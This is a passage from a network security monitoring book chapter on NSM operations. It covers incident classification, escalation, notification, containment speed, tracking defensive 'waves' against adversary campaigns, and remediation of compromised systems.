<p class="calibre1">These sample detection sources and methods will not be available to all </p>
<p class="calibre1">organizations . You may need to rely more heavily on the tools you have avail-</p>
<p class="calibre1">able . It is likely that at the start of the NSM journey, many CIRTs will see gaps </p>
<p class="calibre1">in their ability to detect all phases of the intrusion kill chain . Smart CIRTs will </p>
<p class="calibre1">work to meet those gaps, using a combination of technical and nontechnical </p>
<p class="calibre1">methods, and they will build countermeasures to try to deny, disrupt, degrade, </p>
<p class="calibre1">and/or deceive the adversary . Not all measures will work against all attack </p>
<p class="calibre1">methods, but resisting or detecting “higher” up in the chain (that is, earlier) </p>
<p class="calibre1">gives the defender the best chance to prevent the adversary from accomplish-</p>
<p class="calibre1">ing his mission . </p>
<p class="calibre1">The bottom line is that collection requires several components in order </p>
<p class="calibre1">to be effective. These include:</p>
<p class="calibre1">•  Data from the host, network, and applications forms the technical </p>
<p class="calibre1">foundation</p>
<p class="calibre1">•  A process to accept reports from third parties and constituents to </p>
<p class="calibre1">gather nontechnical data</p>
<p class="calibre1">•  A database, ticketing system, or other platform to manage this </p>
<p class="calibre1">information</p>
<p class="calibre1">We’ve discussed SO as one technical tool for data collection, but it’s not </p>
<p class="calibre1">the only method available. Your organization can use email, help desk staff, </p>
<p class="calibre1">and related processes to manage the nontechnical collection duties. </p>
<p class="calibre1">Some organizations end the NSM process at the collection phase. They </p>
<p class="calibre1">regard NSM collection tools and techniques as yet another set of systems </p>
<p class="calibre1">to deploy and discard. They view collection as the end itself, instead of a </p>
<p class="calibre1">means to an end. Don’t get caught in this trap! While well-instrumented </p>
<p class="calibre1">networks are rare, take the next step and do something with the data. </p>
<p class="calibre1">Enter the analysis phase. </p>
<p class="calibre1"><b class="calibre3">192</b>   Chapter 9</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p227"/> <i class="calibre4"><b class="calibre3">Analysis</b></i></p>
<p class="calibre1">Analysis is the process of identifying and validating normal, suspicious, and </p>
<p class="calibre1">malicious activity. IOCs expedite this process. Formally, IOCs are manifes-</p>
<p class="calibre1">tations of observable or discernible adversary actions. Informally, IOCs are </p>
<p class="calibre1">ways to codify adversary activity so that technical systems can find intruders </p>
<p class="calibre1">in digital evidence. For example, the Mandiant APT1 report ( <i class="calibre4">http://www </i></p>
<p class="calibre1"> <i class="calibre4">.mandiant.com/apt1/</i>) released in February 2013 listed more than 3,000 IOCs, </p>
<p class="calibre1">including IP addresses, domain names, and MD5 hashes of tools used by </p>
<p class="calibre1">Unit 61398 of the People’s Liberation Army. (Mandiant identifies certain </p>
<p class="calibre1">threat groups with the prefix APT, followed by a number, such as APT1, </p>
<p class="calibre1">APT2, and so on.)</p>
<p class="calibre1">I refer to relying on IOCs to find intruders as  <i class="calibre4">IOC-centric analysis</i>, or </p>
<p class="calibre1"> <i class="calibre4">matching</i>. Analysts match IOCs to evidence to identify suspicious or mali-</p>
<p class="calibre1">cious activity, and then validate their findings. </p>
<p class="calibre1">Matching is not the only way to find intruders. More advanced NSM </p>
<p class="calibre1">operations also pursue  <i class="calibre4">IOC-free analysis</i>, or  <i class="calibre4">hunting</i>. </p>
<p class="calibre1">In the mid-2000s, the US Air Force popularized the term  <i class="calibre4">hunter-killer</i> in </p>
<p class="calibre1">the digital world. Security experts performed  <i class="calibre4">friendly force projection</i> on their networks, examining data and sometimes occupying the systems themselves </p>
<p class="calibre1">in order to find advanced threats. Today, NSM professionals like David Bianco </p>
<p class="calibre1">( <i class="calibre4">http://detect-respond.blogspot.com/</i>) and Aaron Wade ( <i class="calibre4">http://forensicir.blogspot </i></p>
<p class="calibre1"> <i class="calibre4">.com/</i>) promote network “hunting trips,” during which a senior investigator </p>
<p class="calibre1">with a novel way to detect intruders guides junior analysts through data and </p>
<p class="calibre1">systems looking for signs of the adversary. Upon validating the technique (and </p>
<p class="calibre1">responding to any enemy actions), the hunters incorporate the new detection </p>
<p class="calibre1">method into a CIRT’s IOC-centric operations. (Chapters 10 and 11 contrast </p>
<p class="calibre1">the matching and hunting methodologies to demonstrate the strengths and </p>
<p class="calibre1">weaknesses of each.)</p>
<p class="calibre1"><b class="calibre3">Intrusions and Incidents</b></p>
<p class="calibre1">Analysts use data to identify and validate intrusions. Intrusions are one </p>
<p class="calibre1">example of an incident. Other examples of incidents include disruption </p>
<p class="calibre1">caused by DDoS attacks, the loss or theft of a mobile device, and lost con-</p>
<p class="calibre1">nectivity due to a severed network cable. But just what is an  <i class="calibre4">intrusion</i>, and </p>
<p class="calibre1">what is an  <i class="calibre4">incident</i>? </p>
<p class="calibre1"> <i class="calibre4">Intrusions</i> are policy violations or computer security incidents. In their </p>
<p class="calibre1">book,  <i class="calibre4">Incident Response and Computer Forensics, Second Edition</i> (McGraw-Hill </p>
<p class="calibre1">Osborne Media, 2003), Kevin Mandia and Chris Prosise define an  <i class="calibre4">incident</i> </p>
<p class="calibre1">as “any unlawful, unauthorized, or unacceptable action that involves a </p>
<p class="calibre1">computer system or a computer network.” These definitions leave plenty </p>
<p class="calibre1">of room to maneuver, and your organization should decide what these </p>
<p class="calibre1">terms mean to you. Your goal should be to adopt internally consistent </p>
<p class="calibre1">definitions. For example, Figure 9-5 depicts a classification method  </p>
<p class="calibre1">( <i class="calibre4">http://taosecurity.blogspot.com/2009/06/information-security-incident.html</i> and <i class="calibre4">http://taosecurity.blogspot.com/2009/06/extending-information-security-incident </i></p>
<p class="calibre1"> <i class="calibre4">.html</i>) that builds on a subset of intrusion categories, or  <i class="calibre4">cat</i> levels, as popularized by the US Department of Defense. </p>
<p class="calibre1">NSM Operations   <b class="calibre3">193</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p228"/>Name</p>
<p class="calibre1">Description</p>
<p class="calibre1">Cat 6</p>
<p class="calibre1">Intruder conducted reconnaissance against asset with access to sensitive data. </p>
<p class="calibre1">Cat 3</p>
<p class="calibre1">Intruder tried to exploit asset with access to sensitive data, but failed. </p>
<p class="calibre1">Cat 2</p>
<p class="calibre1">Intruder compromised asset with access to sensitive data but did not obtain</p>
<p class="calibre1">root- or administrator-level access. </p>
<p class="calibre1">Cat 1</p>
<p class="calibre1">Intruder compromised asset with ready access to sensitive data. </p>
<p class="calibre1">Breach 3 Intruder established command-and-control channel from asset with ready</p>
<p class="calibre1">access to sensitive data. </p>
<p class="calibre1">Breach 2 Intruder exfiltrated nonsensitive data or data that will facilitate access to sensitive data. </p>
<p class="calibre1">Breach 1 Intruder exfiltrated sensitive data or is suspected of exfiltrating sensitive data based on volume, etc. </p>
<p class="calibre1">Crisis 3 Intruder publicized stolen data online or via mainstream media. </p>
<p class="calibre1">Crisis 2 Data loss prompted government or regulatory investigation with fines or other legal consequences. </p>
<p class="calibre1">Crisis 1 Data loss resulted in physical harm or loss of life. </p>
<p class="calibre1"> <i class="calibre4">Figure 9-5: Suggested intrusion categories</i></p>
<p class="calibre1">These categories are designed to help the analyst understand the out-</p>
<p class="calibre1">come and nature of an intrusion. For example, say an analyst determines </p>
<p class="calibre1">that an intruder compromised a computer by executing unauthorized </p>
<p class="calibre1">code, perhaps by tricking a user into opening a malicious attachment that </p>
<p class="calibre1">exploited a vulnerable Java installation. However, if the analyst further </p>
<p class="calibre1">determines that the outbound command-and-control channel was denied </p>
<p class="calibre1">by the enterprise proxy, the intrusion is classified as a Cat 1. Because the </p>
<p class="calibre1">intruder could not establish his command-and-control channel, the inci-</p>
<p class="calibre1">dent falls short of a Breach 3. </p>
<p class="calibre1">As another example, suppose that an analyst finds that an intruder has </p>
<p class="calibre1">compromised a computer by executing unauthorized code on the target. In </p>
<p class="calibre1">this case, the intruder has also  <i class="calibre4">exfiltrated</i>, or stolen, nonsensitive data, such as a user’s shopping list. If the CIRT acts quickly, it can contain the victim </p>
<p class="calibre1">before the intruder steals sensitive data, or pivots from the initial victim </p>
<p class="calibre1">to another victim’s system. If the CIRT succeeds, the incident is a Breach 2. </p>
<p class="calibre1">If the CIRT fails, and the intruder steals sensitive data, the incident is a </p>
<p class="calibre1">Breach 1. If the intruder chooses to publish the stolen data online, the inci-</p>
<p class="calibre1">dent is a Crisis 3. </p>
<p class="calibre1"><b class="calibre3">194</b>   Chapter 9</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p229"/><b class="calibre3">Event Classification</b></p>
<p class="calibre1">CIRTs may classify incidents within their analysis console or via an incident </p>
<p class="calibre1">tracking system. For example, the open source Sguil and Snorby consoles </p>
<p class="calibre1">(discussed in Chapter 8) support incident classification using function keys. </p>
<p class="calibre1">Other options include labeling results in Security Information and Event </p>
<p class="calibre1">Management (SIEM) or log management platforms. </p>
<p class="calibre1">Classification should include the user ID of the analyst making the deci-</p>
<p class="calibre1">sion, the time of the classification, the classification itself, and an optional </p>
<p class="calibre1">comments field. Systems that support forwarding events to more senior </p>
<p class="calibre1">analysts are helpful. Collaboration and social discussions of incident data </p>
<p class="calibre1">(such as tagging, chatrooms, and forums) help improve the decision-</p>
<p class="calibre1">making process. </p>
<p class="calibre1">The bottom line for the analysis process is that analysts must count and </p>
<p class="calibre1">classify all incidents that affect their constituents. Counting and classifying </p>
<p class="calibre1">incidents creates one of the two key metrics any CIRT must collect. (The </p>
<p class="calibre1">second key metric is the time elapsed from incident detection to contain-</p>
<p class="calibre1">ment, as discussed in “Resolution” o<a href="#p232">n page 198. </a>) The definitions do not need to conform to any international standard, but they must be internally </p>
<p class="calibre1">consistent. </p>
<p class="calibre1">That said, if a CIRT wants to contribute data to an incident-reporting </p>
<p class="calibre1">project, the CIRT must align its incident definitions with that of the outside </p>
<p class="calibre1">body. Whether reporting internally or externally, CIRTs should be able to </p>
<p class="calibre1">produce regular reports on the number and types of incidents per unit </p>
<p class="calibre1">time, such as per quarter or per year. What the organization does with the </p>
<p class="calibre1">output of the analysis process is the topic of the next section. </p>
<p class="calibre1"> <i class="calibre4"><b class="calibre3">Escalation</b></i></p>
<p class="calibre1">Escalation refers to the process the CIRT uses to document its findings, </p>
<p class="calibre1">notify its constituents, and receive acknowledgment from the constituents </p>
<p class="calibre1">of the incident report. Escalation may seem like an afterthought, unwor-</p>
<p class="calibre1">thy of its own section, but in large and/or distributed environments, esca-</p>
<p class="calibre1">lation is one of the most difficult aspects of the NSM process. </p>
<p class="calibre1"><b class="calibre3">Documentation of Incidents</b></p>
<p class="calibre1">Documentation creates a record of an event, as well as the CIRT’s work to </p>
<p class="calibre1">handle that event. It’s important to assign a single incident number to each </p>
<p class="calibre1">victim computer. (Consider exploited applications to be computers for the </p>
<p class="calibre1">purposes of this exercise.) Do not assign multiple compromised computers to </p>
<p class="calibre1">a single incident number, unless you use a different term for a single compro-</p>
<p class="calibre1">mised computer. For example, some CIRTs call a single victim a  <i class="calibre4">compromise</i>, </p>
<p class="calibre1">and one or more compromised computers an  <i class="calibre4">incident</i>. The point is to use a </p>
<p class="calibre1">granular term that applies to a single victim computer; without such detail, it </p>
<p class="calibre1">becomes impossible to collect and measure incident response metrics. </p>
<p class="calibre1">NSM Operations   <b class="calibre3">195</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p230"/>Organizations will choose to incorporate different levels of detail into their incident reports. For example, CIRTs handling hundreds or thousands </p>
<p class="calibre1">of incidents per year will likely capture the essential details of a victim system, </p>
<p class="calibre1">while those working with fewer incidents might document in more detail. </p>
<p class="calibre1">When possible, consider documenting incidents using a community </p>
<p class="calibre1">standard like the Vocabulary for Event Recording and Incident Sharing </p>
<p class="calibre1">(VERIS). VERIS provides a common language for describing security inci-</p>
<p class="calibre1">dents consistently. You’ll find examples of how to document incidents of </p>
<p class="calibre1">various types posted at the VERIS project site ( <i class="calibre4">http://veriscommunity.net/</i>). </p>
<p class="calibre1"><b class="calibre3">Notification of Incidents</b></p>
<p class="calibre1">Notification is the next step in the escalation process. It requires you to </p>
<p class="calibre1">identify the compromised asset, find a person or group responsible for the </p>
<p class="calibre1">victim, and deliver an incident report to the affected party. The process </p>
<p class="calibre1">may sound easy, but it can be exceptionally difficult when working with </p>
<p class="calibre1">large or distributed networks due to the generally poor state of inventory </p>
<p class="calibre1">management and network visibility that afflicts many organizations. </p>
<p class="calibre1"><b class="calibre3">whaT iS a DefeNSiBle NeT work archiTecTure? </b></p>
<p class="calibre1">Identifying a compromised asset, finding a responsible owner, and delivering an </p>
<p class="calibre1">incident report are three of the toughest jobs in security, but they are not the only chal enges . I developed a  <i class="calibre4">defensible network architecture</i> to explain the characteristics of organizations whose network offers the greatest overall security ( <i class="calibre4">ht p://</i></p>
<p class="calibre1"> <i class="calibre4">taosecurity.blogspot.com/2008/01/defensible-network-architecture-20 .html </i>) . The list starts with the characteristics a security team should adopt first, and as it continues, the elements become progressively more difficult to implement . </p>
<p class="calibre1">monitored  CIRTs can view all assets at the host, network, and application </p>
<p class="calibre1">log levels . </p>
<p class="calibre1">Inventoried  CIRTs can access an inventory identifying asset location, purpose, </p>
<p class="calibre1">data classification, criticality, owner, and contact method . </p>
<p class="calibre1">control ed  The security team enforces access control at the host, network, and </p>
<p class="calibre1">application levels to permit authorized activities and deny everything else . </p>
<p class="calibre1">claimed  The asset owner listed in the inventory exerts active control of the system . </p>
<p class="calibre1">minimized  The assets provide the minimum surface area required to perform </p>
<p class="calibre1">their business function; unnecessary services, protocols, and software are disabled . </p>
<p class="calibre1">assessed  The CIRT routinely evaluates the configuration of the assets to deter-</p>
<p class="calibre1">mine their security posture . </p>
<p class="calibre1">current  The IT team keeps the assets patch status and configuration up-to-date </p>
<p class="calibre1">with the latest standards . </p>
<p class="calibre1">measured  The IT team and CIRT measure their progress against the previous </p>
<p class="calibre1">steps . </p>
<p class="calibre1">Organizations that adopt a defensible network architecture are best posi-</p>
<p class="calibre1">tioned to resist compromise and to respond effectively to intrusions as they occur . </p>
<p class="calibre1"><b class="calibre3">196</b>   Chapter 9</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p231"/>Notification is impossible if the CIRT cannot map an IP address or </p>
<p class="calibre1">hostname to a real computer, determine its owner, and contact the owner. </p>
<p class="calibre1">If any of these steps fail, the incident remains unreported and the network </p>
<p class="calibre1">at risk. </p>
<p class="calibre1">Notification also depends on the risk posed by a particular incident. </p>
<p class="calibre1">For example, communications about a Cat 2 incident (unauthorized user-</p>
<p class="calibre1">level access) should probably not carry the urgency of communications </p>
<p class="calibre1">about a Breach 2 incident (intruder has stolen sensitive data). </p>
<p class="calibre1">Regardless, all reporting should be in accord with the standard inci-</p>
<p class="calibre1">dent management platform used by the CIRT, but the CIRT and constituents </p>
<p class="calibre1">should agree to different expected response times based on the severity of </p>
<p class="calibre1">incidents. If an incident is urgent, use the telephone or instant messaging; </p>
<p class="calibre1">time is a crucial component in that case. Be sure that everyone understands </p>
<p class="calibre1">how to communicate about incidents and practice the process of notifica-</p>
<p class="calibre1">tion regularly. At the same time, form backup notification plans in case the </p>
<p class="calibre1">primary contacts are unresponsive. </p>
<p class="calibre1">Acknowledgment of the incident report is the final step in the escala-</p>
<p class="calibre1">tion phase, but this step can be a challenge because some constituents </p>
<p class="calibre1">don’t care to know that their computers are compromised (or they’re just </p>
<p class="calibre1">swamped with other work). Others have no IT or security abilities whatso-</p>
<p class="calibre1">ever and may depend completely on the CIRT for the next steps. Whatever </p>
<p class="calibre1">the case, track the acknowledgment time and method in whatever system </p>
<p class="calibre1">you use to manage incident reporting to help improve the overall security </p>
<p class="calibre1">process. </p>
<p class="calibre1"><b class="calibre3">Incident Communication Considerations</b></p>
<p class="calibre1">Organizations compromised by persistent threats should assume that the </p>
<p class="calibre1">adversary has access to their email. Reading CIRT and security team mes-</p>
<p class="calibre1">sages is a favorite attacker pastime. Unfortunately, email is often the least </p>
<p class="calibre1">common denominator when it comes to enterprise communication. Large, </p>
<p class="calibre1">distributed organizations may have different chat applications, collabora-</p>
<p class="calibre1">tion platforms, or other forms of communication, but most everyone has </p>
<p class="calibre1">an email address that they monitor closely. Make sure to encrypt sensi-</p>
<p class="calibre1">tive CIRT-to-constituent email conversations and exchange truly sensitive </p>
<p class="calibre1">information by phone. If you suspect that an attacker has penetrated </p>
<p class="calibre1">your Voice over IP Protocol (VoIP) network, use cell phones. The same </p>
<p class="calibre1">goes for corporate-hosted real-time chat systems and other collaboration </p>
<p class="calibre1">platforms. </p>
<p class="calibre1">Many compromised organizations choose to communicate via email </p>
<p class="calibre1">using something like Gmail or another provider in order to avoid their </p>
<p class="calibre1">compromised systems. Stress-test these response activities before detecting </p>
<p class="calibre1">a serious incident. </p>
<p class="calibre1">Now that the CIRT and constituents are communicating about an inci-</p>
<p class="calibre1">dent, the final phase turns to doing something to mitigate the risk of loss. </p>
<p class="calibre1">NSM Operations   <b class="calibre3">197</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p232"/> <i class="calibre4"><b class="calibre3">Resolution</b></i></p>
<p class="calibre1">Resolution refers to the process CIRTs and constituents use to transition </p>
<p class="calibre1">compromised systems from an at-risk state to a trustworthy state. The actual </p>
<p class="calibre1">transition process takes many forms, depending on the nature of the inci-</p>
<p class="calibre1">dent, as well as the capabilities and risk tolerance of the CIRT and constitu-</p>
<p class="calibre1">ents. Each party must balance the risk of data loss, alteration, or denial </p>
<p class="calibre1">of service against the business requirement of the compromised assets. </p>
<p class="calibre1">Frequently, the CIRT will want the compromised computer off the network </p>
<p class="calibre1">as quickly as possible, while the business owner will want it online no matter </p>
<p class="calibre1">what the cost. </p>
<p class="calibre1">When resolving incidents, consider establishing  <i class="calibre4">risk-mitigation guidelines</i>. </p>
<p class="calibre1">When any asset is compromised, the constituent must take at least one mea-</p>
<p class="calibre1">sure to reduce risk of data loss, alteration, or denial of service, depending </p>
<p class="calibre1">on the nature of the incident. Taking no action is not an option. Tolerating </p>
<p class="calibre1">an intruder on the network is at best poor practice and at worst an invita-</p>
<p class="calibre1">tion for a lawsuit or other penalty. </p>
<p class="calibre1"><b class="calibre3">Containment techniques</b></p>
<p class="calibre1">The CIRT and constituents should devise a hierarchy of possible risk-</p>
<p class="calibre1">mitigation tactics. These response options focus on containing intruders </p>
<p class="calibre1">and limiting their freedom to interact with victim computers, or pivot from </p>
<p class="calibre1">a victim computer to yet another victim. </p>
<p class="calibre1">When containing an intruder, begin with the victimized computer and </p>
<p class="calibre1">consider the following possibilities:</p>
<p class="calibre1">•  Put the computer in hibernate mode. (Don’t turn it off; you will lose </p>
<p class="calibre1">valuable volatile data in memory.)</p>
<p class="calibre1">•  Shut down the port the computer uses to accesses the network. </p>
<p class="calibre1">•  Implement a local firewall rule or kernel-level filter to deny the com-</p>
<p class="calibre1">puter the ability to communicate with other computers. </p>
<p class="calibre1">•  Implement an access control list entry to prevent the computer from </p>
<p class="calibre1">communicating with other computers. </p>
<p class="calibre1">•  Implement a routing change to prevent the computer from communi-</p>
<p class="calibre1">cating with other computers. </p>
<p class="calibre1">•  Implement a firewall or proxy block to deny the computer access to the </p>
<p class="calibre1">Internet, which will cut off remote command-and-control channels. </p>
<p class="calibre1">More advanced CIRTs will have other tricks up their sleeves, such as </p>
<p class="calibre1">transitioning the intruder to a honey network of simulated computers for </p>
<p class="calibre1">study in a “safe” environment. (A honey network is a collection of computers </p>
<p class="calibre1">deployed by a CIRT to entice, trap, and observe intruders.) Whatever the </p>
<p class="calibre1">choice of action, key to this process is ensuring that the CIRT and constitu-</p>
<p class="calibre1">ent take some action to reduce risk of loss. </p>
<p class="calibre1"><b class="calibre3">198</b>   Chapter 9</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p233"/><b class="calibre3">Speed of Containment</b></p>
<p class="calibre1">The speed with which a CIRT and constituent take containment actions is </p>
<p class="calibre1">the subject of hot debate in the security world. Some argue for fast contain-</p>
<p class="calibre1">ment in order to limit risk; others argue for slower containment, providing </p>
<p class="calibre1">more time to learn about an adversary. The best answer is to contain inci-</p>
<p class="calibre1">dents as quickly as possible, as long as the CIRT can scope the incident to </p>
<p class="calibre1">the best of its capability. </p>
<p class="calibre1"> <i class="calibre4">Scoping the incident</i> means understanding the intruder’s reach. Is he lim-</p>
<p class="calibre1">ited to interacting with only the one computer identified thus far? Does he </p>
<p class="calibre1">control more computers, or even the entire network by virtue of exploita-</p>
<p class="calibre1">tion of the Active Directory domain controllers? </p>
<p class="calibre1">The speed with which a CIRT can make the containment decision is one </p>
<p class="calibre1">of the primary ways to measure its maturity. If the CIRT regularly learns of </p>
<p class="calibre1">the presence of advanced (or even routine) threats via notification by exter-</p>
<p class="calibre1">nal parties, then rapid containment is less likely to be effective. A CIRT that </p>
<p class="calibre1">cannot find intrusions within its own environment is not likely to be able to </p>
<p class="calibre1">rapidly scope an incident. “Pulling the plug” on the first identified victim will </p>
<p class="calibre1">probably leave dozens, hundreds, or thousands of other victims online and </p>
<p class="calibre1">available to the adversary. </p>
<p class="calibre1">On the other hand, if the CIRT develops its own threat intelligence, </p>
<p class="calibre1">maintains pervasive visibility, and quickly finds intruders on its own, it is </p>
<p class="calibre1">more likely to be able to scope an incident in a minimum amount of time. </p>
<p class="calibre1">CIRTs with that sort of capability should establish the intruder’s reach as </p>
<p class="calibre1">rapidly as possible, and then just as quickly contain the victim(s) to limit </p>
<p class="calibre1">the adversary’s options. </p>
<p class="calibre1">Deciding which containment action to take can be tricky. One way to </p>
<p class="calibre1">decide is to adopt either a threat-centric or an asset-centric approach to </p>
<p class="calibre1">defending information resources. </p>
<p class="calibre1">A  <i class="calibre4">threat-centric</i> approach focuses on the presumed nature of the adver-</p>
<p class="calibre1">sary. A mature CIRT will likely track many distinct threat groups, and rec-</p>
<p class="calibre1">ognize when a more sophisticated or damaging threat compromises one </p>
<p class="calibre1">or more computers. When the CIRT detects that a threat group is active in </p>
<p class="calibre1">the environment, the CIRT will likely act quickly to contain the adversary. </p>
<p class="calibre1">If the CIRT instead notices a more routine event involving a criminal actor, </p>
<p class="calibre1">the CIRT may take a more leisurely response. </p>
<p class="calibre1">An  <i class="calibre4">asset-centric</i> approach focuses on the presumed nature of the victim </p>
<p class="calibre1">computer. A CIRT working with a mature IT and business organization </p>
<p class="calibre1">will understand the sensitivity of the data on its networks and the roles of </p>
<p class="calibre1">systems processing that data. When the CIRT detects an incident affecting </p>
<p class="calibre1">a business-essential asset, the CIRT acts quickly. If the CIRT instead notices </p>
<p class="calibre1">activity affecting a less important asset, such as an employee laptop, the </p>
<p class="calibre1">CIRT acts less quickly. Some CIRTs take a hybrid approach, weighing the </p>
<p class="calibre1">relative nature of the threat actor and the affected asset. </p>
<p class="calibre1">CIRTs should document their processes in  <i class="calibre4">playbooks</i> that outline the </p>
<p class="calibre1">responsibilities and actions to be taken by CIRTs and constituents. CIRTs </p>
<p class="calibre1">should also track intruder activity differently, depending on the nature of </p>
<p class="calibre1">the threat. For example, mature CIRTs opposing the APT and aggressive </p>
<p class="calibre1">NSM Operations   <b class="calibre3">199</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p234"/><b class="calibre3">how To Tr ack waveS aND caMPaigNS</b></p>
<p class="calibre1">Although CIRTs should assign numbers of some sort to incidents (such as </p>
<p class="calibre1">201305180006, for the sixth incident on the 18th of May, 2013), I recommend </p>
<p class="calibre1">that CIRTs devise names to refer to waves . Names are easier to remember than </p>
<p class="calibre1">numbers, and using them makes it easier for CIRTs to discuss serious activities </p>
<p class="calibre1">with constituents . Some CIRTs use the names assigned by the National Weather </p>
<p class="calibre1">Service’s National Hurricane Center ( <i class="calibre4">ht p://www.nhc.noaa.gov/aboutnames </i></p>
<p class="calibre1"> <i class="calibre4">.shtml</i>) for a year’s worth of wave names . For example, the first wave of 2013 </p>
<p class="calibre1">initiated by a CIRT to counter advanced threat activity would be named Wave </p>
<p class="calibre1">Andrea, the second would be Wave Barry, and so on . </p>
<p class="calibre1">It is crucial to recognize that, in the heat of an intrusion, CIRTs lack the </p>
<p class="calibre1">ability to ful y identify adversary activity . It does not make sense to assign a </p>
<p class="calibre1">campaign to adversary activity in the heat of battle . Rather, organize accord-</p>
<p class="calibre1">ing to how the CIRT is responding . Outside the digital melee of the ongoing </p>
<p class="calibre1">response activities, the CIRT’s intel igence team can perform analysis to deter-</p>
<p class="calibre1">mine how observed adversary actions fit into the overall picture . </p>
<p class="calibre1">Mature CIRTs track numerous threat groups, such as nation-state, criminal, </p>
<p class="calibre1">and hacktivist actors . CIRT intel igence teams will assign adversary activity to </p>
<p class="calibre1">these threat groups, pairing the CIRT’s wave response with the threat group in </p>
<p class="calibre1">question . For example, the intel igence team may realize that Wave Andrea </p>
<p class="calibre1">was the CIRT’s response to APT12, while Wave Barry was the CIRT’s response </p>
<p class="calibre1">to APT1 . </p>
<p class="calibre1">criminal groups often talk in terms of adversary  <i class="calibre4">campaigns</i>. A campaign </p>
<p class="calibre1">is a long-term operation conducted by an adversary, usually to steal infor-</p>
<p class="calibre1">mation. A single intrusion is likely to be just one piece of an adversary’s </p>
<p class="calibre1">campaign. </p>
<p class="calibre1">CIRTs fighting persistent foes tend to organize their response actions </p>
<p class="calibre1">as  <i class="calibre4">waves. </i> A wave does not exactly correspond to a campaign. Whereas a </p>
<p class="calibre1">campaign refers to the totality of an intruder’s prolonged attack against </p>
<p class="calibre1">a target, a wave refers to the CIRT’s efforts to detect and respond to the </p>
<p class="calibre1">adversary. In other words, intruders conduct campaigns, and CIRTs defend </p>
<p class="calibre1">in waves. CIRTs will never have perfect visibility into adversary activity. </p>
<p class="calibre1">Therefore, track what you  <i class="calibre4">think</i> the adversary is doing (for example, a cam-</p>
<p class="calibre1">paign), as well as what the CIRT  <i class="calibre4">is</i> doing (for example, a wave). </p>
<p class="calibre1">Mature CIRTs, upon recognizing that they need to respond to a serious </p>
<p class="calibre1">incident, are likely to take the following steps. </p>
<p class="calibre1">1.  Select a wave name and declare the wave open. </p>
<p class="calibre1">2.  Create a telephone bridge and password-protected real-time chatroom </p>
<p class="calibre1">to discuss activities to counter the adversary. </p>
<p class="calibre1">3.  Send an urgent notice to affected constituents letting them know that </p>
<p class="calibre1">the CIRT has opened a wave and how to communicate with the CIRT </p>
<p class="calibre1">via the telephone and chatroom. </p>
<p class="calibre1"><b class="calibre3">200</b>   Chapter 9</p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p235"/>4.  Collect and analyze additional evidence as necessary to scope the incident. </p>
<p class="calibre1">5.  Escalate rapid incident reporting to constituents via real-time and digi-</p>
<p class="calibre1">tal means, identifying victim systems and data. </p>
<p class="calibre1">6.  Coordinate a containment action with the constituents to limit the risk </p>
<p class="calibre1">of data loss, alteration, or denial of service. </p>
<p class="calibre1">7.  Once containment for all victims is in place, declare the wave closed. </p>
<p class="calibre1">8.  Throughout the duration of the wave, communicate regularly with con-</p>
<p class="calibre1">stituents to keep them informed and to reduce tension. </p>
<p class="calibre1">For less serious events, CIRTs do not need to employ such elaborate </p>
<p class="calibre1">communication methods. CIRTs will concentrate on documenting the </p>
<p class="calibre1">incident in an efficient manner and notifying the constituent within the </p>
<p class="calibre1">expected service time windows. For both types of events, CIRTs should mea-</p>
<p class="calibre1">sure times of key steps in the detection and response process. For example, </p>
<p class="calibre1">the text at the bottom of Figure 9-2 (which illustrates the elements of the </p>
<p class="calibre1">NSM process) depicts points during the incident detection and response </p>
<p class="calibre1">subprocesses when time should be recorded. Figure 9-6 reproduces those </p>
<p class="calibre1">key moments. </p>
<p class="calibre1">Request more data</p>
<p class="calibre1">Event observed/stored</p>
<p class="calibre1">Identification</p>
<p class="calibre1">Validation</p>
<p class="calibre1">Documentation</p>
<p class="calibre1">Notification</p>
<p class="calibre1">Acknowledgment</p>
<p class="calibre1">Containment</p>
<p class="calibre1">Remediation</p>
<p class="calibre1"> <i class="calibre4">Figure 9-6: Events for which time should be recorded</i></p>
<p class="calibre1">So far, we’ve focused on containment, or countermeasures, designed </p>
<p class="calibre1">to limit risk, but containment alone still leaves the victim computer com-</p>
<p class="calibre1">promised. Once an attack has been contained, it’s time for  <i class="calibre4">remediation, </i> or </p>
<p class="calibre1">restoring the compromised asset to a trustworthy state. </p>
<p class="calibre1"><b class="calibre3">remediation</b></p>
<p class="calibre1">Remediation is another hot topic in the security industry. Some argue that </p>
<p class="calibre1">systems can be “cleaned” to remove the intruder’s tools, persistence mecha-</p>
<p class="calibre1">nisms, and access methods. Others say victim computers should be rebuilt </p>
<p class="calibre1">from installation media or trustworthy backups. A few even say compromised </p>
<p class="calibre1">systems should be reflashed or abandoned, because advanced intruders can </p>
<p class="calibre1">implant persistence mechanisms in hardware! </p>
<p class="calibre1">You should rebuild any system with which an adversary was known </p>
<p class="calibre1">to interact, but only after fully scoping the incident. Here,  <i class="calibre4">interact</i> means </p>
<p class="calibre1">there is a forensic reason to assume the adversary acquired and utilized </p>
<p class="calibre1">unauthorized access to a victim. It does not mean the intruder  <i class="calibre4">could</i> have </p>
<p class="calibre1">accessed the victim, but did not. The fact of that matter is that it is virtu-</p>
<p class="calibre1">ally impossible for a CIRT to know all the actions an intruder took on any </p>
<p class="calibre1">NSM Operations   <b class="calibre3">201</b></p>
<p class="calibre1"><a href="http://www.it-ebooks.info/">www.it-ebooks.info</a></p>
<p class="calibre1"><a id="p236"/>victim. Usually, a CIRT sees only the proverbial “tip of the iceberg.” After all, why jeopardize a remediation plan by trying to “clean” a victim, only to </p>
<p class="calibre1">learn that disinfection failed to remove a persistence mechanism? </p>
